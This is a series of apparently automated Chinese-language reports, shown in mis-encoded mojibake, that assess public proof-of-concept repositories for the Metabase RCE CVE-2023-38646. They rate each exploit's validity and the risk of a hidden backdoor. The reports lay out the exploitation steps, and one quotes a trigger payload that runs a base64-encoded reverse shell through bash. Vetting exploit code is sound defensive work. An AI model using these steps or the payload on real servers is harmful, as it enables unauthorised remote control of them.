æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

